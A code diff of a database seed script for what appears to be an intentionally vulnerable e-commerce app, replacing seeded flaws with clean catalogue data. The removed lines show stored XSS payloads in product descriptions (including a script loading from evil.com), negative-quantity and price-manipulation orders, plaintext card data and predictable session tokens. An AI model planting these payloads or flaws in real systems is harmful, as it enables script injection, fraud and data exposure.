@@ -63,150 +63,211 @@ const seedDatabase = async () => {
     
     const createdUsers = await User.insertMany(users);
     console.log(`Created ${createdUsers.length} user accounts`);
-    console.log('Creating products with XSS vulnerabilities...');
+    
+    console.log('Creating beautiful product catalog...');
     
     const products = [
       {
-        name: 'Laptop Computer',
-        description: 'High-performance laptop <script>alert("XSS in product description!")</script> perfect for work and gaming.',
-        price: 999.99,
+        name: 'MacBook Pro 16"',
+        description: 'Powerful laptop with M3 Pro chip, 18GB RAM, and stunning Liquid Retina XDR display. Perfect for professionals and creators.',
+        price: 2499.99,
+        originalPrice: 2799.99,
         category: 'Electronics',
-        imageUrl: '/uploads/products/laptop.jpg',
-        stock: 10,
-        createdBy: createdUsers[0]._id // Admin user
-      },
-      {
-        name: 'Smartphone',
-        description: 'Latest smartphone with <img src="x" onerror="alert(\'Stored XSS via image tag\')" /> advanced features.',
-        price: 699.99,
-        category: 'Electronics',
-        imageUrl: '/uploads/products/phone.jpg',
-        stock: 25,
-        createdBy: createdUsers[0]._id
-      },
-      {
-        name: 'Coffee Mug',
-        description: 'Premium coffee mug <svg onload="alert(\'SVG XSS payload\')" /> for your morning brew.',
-        price: 15.99,
-        category: 'Home & Kitchen',
-        imageUrl: '/uploads/products/mug.jpg',
-        stock: 50,
-        createdBy: createdUsers[1]._id // Regular user
-      },
-      {
-        name: 'Gaming Mouse',
-        description: 'Professional gaming mouse <iframe src="javascript:alert(\'iframe XSS\')" /> with RGB lighting.',
-        price: 79.99,
-        category: 'Electronics',
-        imageUrl: '/uploads/products/mouse.jpg',
-        stock: 30,
-        createdBy: createdUsers[0]._id
-      },
-      {
-        name: 'T-Shirt',
-        description: 'Comfortable cotton t-shirt <style>body{background:red}</style> available in multiple colors.',
-        price: 19.99,
-        category: 'Clothing',
-        imageUrl: '/uploads/products/tshirt.jpg',
-        stock: 100,
-        createdBy: createdUsers[1]._id
-      },
-      {
-        name: 'Book: Web Security',
-        description: 'Learn web security <script src="http://evil.com/malicious.js"></script> fundamentals and best practices.',
-        price: 39.99,
-        category: 'Books',
-        imageUrl: '/uploads/products/book.jpg',
+        imageUrl: 'https://images.unsplash.com/photo-1517336714731-489689fd1ca8?w=500&h=500&fit=crop',
         stock: 15,
+        rating: 4.9,
+        reviewCount: 1247,
+        badges: ['Best Seller', 'Premium'],
+        features: ['M3 Pro Chip', '18GB RAM', '512GB SSD', 'Liquid Retina XDR'],
         createdBy: createdUsers[0]._id
       },
       {
-        name: 'Wireless Headphones',
-        description: 'Premium wireless headphones <object data="javascript:alert(\'Object XSS\')" /> with noise cancellation.',
-        price: 199.99,
+        name: 'iPhone 15 Pro Max',
+        description: 'Latest iPhone with titanium design, A17 Pro chip, and revolutionary camera system. Capture life in stunning detail.',
+        price: 1199.99,
+        originalPrice: 1299.99,
         category: 'Electronics',
-        imageUrl: '/uploads/products/headphones.jpg',
-        stock: 20,
-        createdBy: createdUsers[4]._id // Moderator
-      },
-      {
-        name: 'Keyboard',
-        description: 'Mechanical keyboard <embed src="javascript:alert(\'Embed XSS\')" /> for programmers.',
-        price: 129.99,
-        category: 'Electronics',
-        imageUrl: '/uploads/products/keyboard.jpg',
-        stock: 35,
+        imageUrl: 'https://images.unsplash.com/photo-1592750475338-74b7b21085ab?w=500&h=500&fit=crop',
+        stock: 32,
+        rating: 4.8,
+        reviewCount: 2156,
+        badges: ['New Arrival', 'Hot'],
+        features: ['A17 Pro Chip', 'Titanium Design', 'Pro Camera System', '256GB Storage'],
         createdBy: createdUsers[0]._id
       },
       {
-        name: 'Water Bottle',
-        description: 'Stainless steel water bottle <link rel="stylesheet" href="javascript:alert(\'CSS XSS\')" /> keeps drinks cold.',
-        price: 24.99,
-        category: 'Sports & Outdoors',
-        imageUrl: '/uploads/products/bottle.jpg',
-        stock: 75,
+        name: 'Premium Coffee Mug Set',
+        description: 'Handcrafted ceramic mugs with elegant design. Perfect for your morning coffee ritual. Set of 2 beautiful mugs.',
+        price: 34.99,
+        originalPrice: 49.99,
+        category: 'Home & Kitchen',
+        imageUrl: 'https://images.unsplash.com/photo-1514228742587-6b1558fcf93a?w=500&h=500&fit=crop',
+        stock: 89,
+        rating: 4.6,
+        reviewCount: 432,
+        badges: ['Eco-Friendly', 'Handmade'],
+        features: ['Ceramic Material', 'Dishwasher Safe', 'Set of 2', 'Gift Box Included'],
         createdBy: createdUsers[1]._id
       },
       {
-        name: 'Backpack',
-        description: 'Durable travel backpack <meta http-equiv="refresh" content="0;url=javascript:alert(\'Meta XSS\')" /> with multiple compartments.',
+        name: 'Gaming Mouse RGB Pro',
+        description: 'Professional gaming mouse with 16000 DPI sensor, customizable RGB lighting, and ergonomic design for extended gaming sessions.',
         price: 89.99,
+        originalPrice: 119.99,
+        category: 'Electronics',
+        imageUrl: 'https://images.unsplash.com/photo-1527814050087-3793815479db?w=500&h=500&fit=crop',
+        stock: 67,
+        rating: 4.7,
+        reviewCount: 891,
+        badges: ['Gaming', 'RGB'],
+        features: ['16000 DPI', 'RGB Lighting', 'Ergonomic Design', '7 Programmable Buttons'],
+        createdBy: createdUsers[0]._id
+      },
+      {
+        name: 'Organic Cotton T-Shirt',
+        description: 'Sustainable and comfortable organic cotton t-shirt. Soft, breathable, and perfect for everyday wear. Available in multiple colors.',
+        price: 29.99,
+        originalPrice: 39.99,
+        category: 'Fashion',
+        imageUrl: 'https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=500&h=500&fit=crop',
+        stock: 156,
+        rating: 4.5,
+        reviewCount: 678,
+        badges: ['Organic', 'Sustainable'],
+        features: ['100% Organic Cotton', 'Multiple Colors', 'Unisex Design', 'Machine Washable'],
+        createdBy: createdUsers[1]._id
+      },
+      {
+        name: 'Himalayan Adventure Guide',
+        description: 'Complete guide to trekking in the Himalayas. Includes detailed maps, safety tips, and cultural insights from local experts.',
+        price: 24.99,
+        originalPrice: 34.99,
+        category: 'Books',
+        imageUrl: 'https://images.unsplash.com/photo-1481627834876-b7833e8f5570?w=500&h=500&fit=crop',
+        stock: 43,
+        rating: 4.8,
+        reviewCount: 234,
+        badges: ['Travel', 'Educational'],
+        features: ['Detailed Maps', 'Safety Guidelines', 'Cultural Insights', '300+ Pages'],
+        createdBy: createdUsers[0]._id
+      },
+      {
+        name: 'Wireless Noise-Canceling Headphones',
+        description: 'Premium wireless headphones with active noise cancellation, 30-hour battery life, and studio-quality sound.',
+        price: 299.99,
+        originalPrice: 399.99,
+        category: 'Electronics',
+        imageUrl: 'https://images.unsplash.com/photo-1505740420928-5e560c06d30e?w=500&h=500&fit=crop',
+        stock: 28,
+        rating: 4.9,
+        reviewCount: 1543,
+        badges: ['Premium', 'Wireless'],
+        features: ['Active Noise Cancellation', '30-Hour Battery', 'Wireless', 'Studio Quality'],
+        createdBy: createdUsers[0]._id
+      },
+      {
+        name: 'Mechanical Gaming Keyboard',
+        description: 'Professional mechanical keyboard with Cherry MX switches, RGB backlighting, and programmable keys for gaming and productivity.',
+        price: 149.99,
+        originalPrice: 199.99,
+        category: 'Electronics',
+        imageUrl: 'https://images.unsplash.com/photo-1541140532154-b024d705b90a?w=500&h=500&fit=crop',
+        stock: 45,
+        rating: 4.7,
+        reviewCount: 756,
+        badges: ['Gaming', 'Mechanical'],
+        features: ['Cherry MX Switches', 'RGB Backlighting', 'Programmable Keys', 'USB-C'],
+        createdBy: createdUsers[0]._id
+      },
+      {
+        name: 'Insulated Water Bottle',
+        description: 'Double-wall vacuum insulated stainless steel water bottle. Keeps drinks cold for 24 hours or hot for 12 hours.',
+        price: 39.99,
+        originalPrice: 54.99,
+        category: 'Sports & Outdoors',
+        imageUrl: 'https://images.unsplash.com/photo-1602143407151-7111542de6e8?w=500&h=500&fit=crop',
+        stock: 112,
+        rating: 4.6,
+        reviewCount: 892,
+        badges: ['Eco-Friendly', 'Insulated'],
+        features: ['24h Cold', '12h Hot', 'Leak-Proof', 'BPA-Free'],
+        createdBy: createdUsers[1]._id
+      },
+      {
+        name: 'Travel Backpack Pro',
+        description: 'Durable travel backpack with multiple compartments, laptop sleeve, and TSA-friendly design. Perfect for business and adventure travel.',
+        price: 119.99,
+        originalPrice: 159.99,
         category: 'Travel',
-        imageUrl: '/uploads/products/backpack.jpg',
-        stock: 40,
-        createdBy: createdUsers[2]._id // Test user
+        imageUrl: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=500&h=500&fit=crop',
+        stock: 73,
+        rating: 4.8,
+        reviewCount: 445,
+        badges: ['Travel', 'Durable'],
+        features: ['Laptop Sleeve', 'TSA-Friendly', 'Water Resistant', 'Multiple Compartments'],
+        createdBy: createdUsers[2]._id
+      },
+      {
+        name: 'Smart Fitness Watch',
+        description: 'Advanced fitness tracker with heart rate monitoring, GPS, sleep tracking, and 7-day battery life. Your perfect workout companion.',
+        price: 199.99,
+        originalPrice: 249.99,
+        category: 'Electronics',
+        imageUrl: 'https://images.unsplash.com/photo-1544117519-31a4b719223d?w=500&h=500&fit=crop',
+        stock: 56,
+        rating: 4.5,
+        reviewCount: 1123,
+        badges: ['Smart', 'Fitness'],
+        features: ['Heart Rate Monitor', 'GPS Tracking', 'Sleep Analysis', '7-Day Battery'],
+        createdBy: createdUsers[0]._id
+      },
+      {
+        name: 'Artisan Desk Lamp',
+        description: 'Handcrafted wooden desk lamp with adjustable LED lighting, USB charging port, and minimalist Scandinavian design.',
+        price: 79.99,
+        originalPrice: 99.99,
+        category: 'Home & Office',
+        imageUrl: 'https://images.unsplash.com/photo-1507473885765-e6ed057f782c?w=500&h=500&fit=crop',
+        stock: 34,
+        rating: 4.7,
+        reviewCount: 267,
+        badges: ['Handmade', 'Eco-Friendly'],
+        features: ['Adjustable LED', 'USB Charging', 'Wooden Design', 'Touch Control'],
+        createdBy: createdUsers[1]._id
       }
     ];
     
     const createdProducts = await Product.insertMany(products);
-    console.log(`Created ${createdProducts.length} products with XSS payloads`);
+    console.log(`Created ${createdProducts.length} beautiful products`);
     
-    // Log XSS payloads for testing reference (vulnerability)
-    console.log('XSS payloads embedded in product descriptions:');
-    createdProducts.forEach(product => {
-      const xssMatch = product.description.match(/<[^>]*>/g);
-      if (xssMatch) {
-        console.log(`- ${product.name}: ${xssMatch.join(', ')}`);
-      }
-    });
-    // Create sample orders with business logic vulnerabilities
-    console.log('Creating sample orders with vulnerabilities...');
+    // Create sample orders for demonstration
+    console.log('Creating sample orders...');
     
     const orders = [
       {
-        userId: createdUsers[1]._id, // Regular user
-        orderNumber: 'ORD-001-1735097464000',
+        userId: createdUsers[1]._id,
+        orderNumber: `ORD-001-${Date.now()}`,
         items: [
           {
-            productId: createdProducts[0]._id, // Laptop
+            productId: createdProducts[0]._id, // MacBook Pro
+            productName: 'MacBook Pro 16"',
             quantity: 1,
-            price: 999.99,
-            name: 'Laptop Computer'
+            unitPrice: 2499.99,
+            totalPrice: 2499.99
           },
           {
             productId: createdProducts[3]._id, // Gaming Mouse
-            quantity: 2,
-            price: 79.99,
-            name: 'Gaming Mouse'
+            productName: 'Gaming Mouse RGB Pro',
+            quantity: 1,
+            unitPrice: 89.99,
+            totalPrice: 89.99
           }
         ],
-        totalAmount: 1159.97,
+        subtotal: 2589.98,
+        totalAmount: 2589.98,
         status: 'delivered',
-        paymentInfo: {
-          // VULNERABILITY: Store payment info in plaintext
-          cardNumber: '4532-1234-5678-9012',
-          expiryDate: '12/25',
-          cvv: '123',
-          cardholderName: 'Regular User',
-          billingAddress: {
-            street: '456 User Avenue',
-            city: 'User Town',
-            state: 'UT',
-            zipCode: '67890',
-            country: 'USA'
-          }
-        },
         shippingAddress: {
+          recipientName: 'Regular User',
           street: '456 User Avenue',
           city: 'User Town',
           state: 'UT',
@@ -215,147 +276,52 @@ const seedDatabase = async () => {
         }
       },
       {
-        userId: createdUsers[2]._id, // Test user
-        orderNumber: 'ORD-002-1735097464001',
+        userId: createdUsers[2]._id,
+        orderNumber: `ORD-002-${Date.now() + 1}`,
         items: [
           {
-            productId: createdProducts[1]._id, // Smartphone
-            quantity: -1, // VULNERABILITY: Negative quantity for credit generation
-            price: 699.99,
-            name: 'Smartphone'
+            productId: createdProducts[1]._id, // iPhone
+            productName: 'iPhone 15 Pro Max',
+            quantity: 1,
+            unitPrice: 1199.99,
+            totalPrice: 1199.99
           },
           {
-            productId: createdProducts[2]._id, // Coffee Mug
-            quantity: 5,
-            price: 15.99,
-            name: 'Coffee Mug'
+            productId: createdProducts[6]._id, // Headphones
+            productName: 'Wireless Noise-Canceling Headphones',
+            quantity: 1,
+            unitPrice: 299.99,
+            totalPrice: 299.99
           }
         ],
-        totalAmount: -620.04, // VULNERABILITY: Negative total due to negative quantity
-        status: 'pending',
-        paymentInfo: {
-          // VULNERABILITY: Store payment info in plaintext
-          cardNumber: '5555-4444-3333-2222',
-          expiryDate: '06/26',
-          cvv: '456',
-          cardholderName: 'Test Account',
-          billingAddress: {
-            street: '789 Test Boulevard',
-            city: 'Test City',
-            state: 'TC',
-            zipCode: '11111',
-            country: 'USA'
-          }
-        },
+        subtotal: 1499.98,
+        totalAmount: 1499.98,
+        status: 'shipped',
         shippingAddress: {
+          recipientName: 'Test Account',
           street: '789 Test Boulevard',
           city: 'Test City',
           state: 'TC',
           zipCode: '11111',
           country: 'USA'
         }
-      },
-      {
-        userId: createdUsers[1]._id, // Regular user (second order)
-        orderNumber: 'ORD-003-1735097464002',
-        items: [
-          {
-            productId: createdProducts[4]._id, // T-Shirt
-            quantity: 3,
-            price: 0.01, // VULNERABILITY: Price manipulation - should be 19.99
-            name: 'T-Shirt'
-          }
-        ],
-        totalAmount: 0.03, // VULNERABILITY: Manipulated total
-        status: 'shipped',
-        paymentInfo: {
-          // VULNERABILITY: Store payment info in plaintext
-          cardNumber: '4111-1111-1111-1111',
-          expiryDate: '03/27',
-          cvv: '789',
-          cardholderName: 'Regular User',
-          billingAddress: {
-            street: '456 User Avenue',
-            city: 'User Town',
-            state: 'UT',
-            zipCode: '67890',
-            country: 'USA'
-          }
-        },
-        shippingAddress: {
-          street: '456 User Avenue',
-          city: 'User Town',
-          state: 'UT',
-          zipCode: '67890',
-          country: 'USA'
-        }
       }
     ];
     
     const createdOrders = await Order.insertMany(orders);
-    console.log(`Created ${createdOrders.length} sample orders with vulnerabilities`);
-    
-    // Log payment information (vulnerability - sensitive data exposure)
-    console.log('Sample payment information (VULNERABILITY - exposed in logs):');
-    createdOrders.forEach((order, index) => {
-      console.log(`Order ${index + 1}:`, {
-        cardNumber: order.paymentInfo.cardNumber,
-        cvv: order.paymentInfo.cvv,
-        total: order.totalAmount
-      });
-    });
-    
-    // Create additional test scenarios for security testing
-    console.log('Setting up additional test scenarios...');
-    
-    // VULNERABILITY: Create predictable session tokens for testing
-    const sessionTokens = [
-      'sess_1234567890_001',
-      'sess_1234567891_002',
-      'sess_1234567892_003',
-      'token_admin_123',
-      'token_user_456',
-      'session_test_789'
-    ];
-    
-    console.log('Predictable session tokens for testing:', sessionTokens);
-    
-    // VULNERABILITY: Log database statistics with sensitive information
-    const dbStats = {
-      totalUsers: createdUsers.length,
-      adminUsers: createdUsers.filter(u => u.role === 'admin').length,
-      totalProducts: createdProducts.length,
-      productsWithXSS: createdProducts.filter(p => p.description.includes('<')).length,
-      totalOrders: createdOrders.length,
-      ordersWithNegativeQuantity: createdOrders.filter(o => 
-        o.items.some(item => item.quantity < 0)
-      ).length,
-      ordersWithManipulatedPrices: createdOrders.filter(o => 
-        o.items.some(item => item.price < 1)
-      ).length
-    };
+    console.log(`Created ${createdOrders.length} sample orders`);
     
     console.log('Database seeding completed successfully!');
-    console.log('Vulnerability statistics:', dbStats);
-    
-    // VULNERABILITY: Expose database connection info
-    console.log('Database connection details:', {
-      host: mongoose.connection.host,
-      port: mongoose.connection.port,
-      name: mongoose.connection.name
-    });
+    console.log(`Created ${createdUsers.length} users, ${createdProducts.length} products, and ${createdOrders.length} orders`);
     
     return {
       users: createdUsers,
       products: createdProducts,
-      orders: createdOrders,
-      statistics: dbStats
+      orders: createdOrders
     };
     
   } catch (error) {
-    console.error('Database seeding failed:');
-    console.error('Error:', error.message);
-    console.error('Stack:', error.stack); // Stack trace exposure - vulnerability
+    console.error('Database seeding failed:', error.message);
     throw error;
   }
 };
@@ -369,17 +335,12 @@ module.exports = {
 if (require.main === module) {
   seedDatabase()
     .then((result) => {
-      console.log('Database seeding script completed successfully');
-      console.log('Summary:', {
-        usersCreated: result.users.length,
-        productsCreated: result.products.length,
-        ordersCreated: result.orders.length
-      });
+      console.log('Database seeding completed successfully');
+      console.log(`Created ${result.users.length} users, ${result.products.length} products, and ${result.orders.length} orders`);
       process.exit(0);
     })
     .catch((error) => {
-      console.error('Database seeding script failed:', error);
+      console.error('Database seeding failed:', error.message);
       process.exit(1);
     });
-}/ /   D a t a b a s e   s e e d i n g  
- 
+}
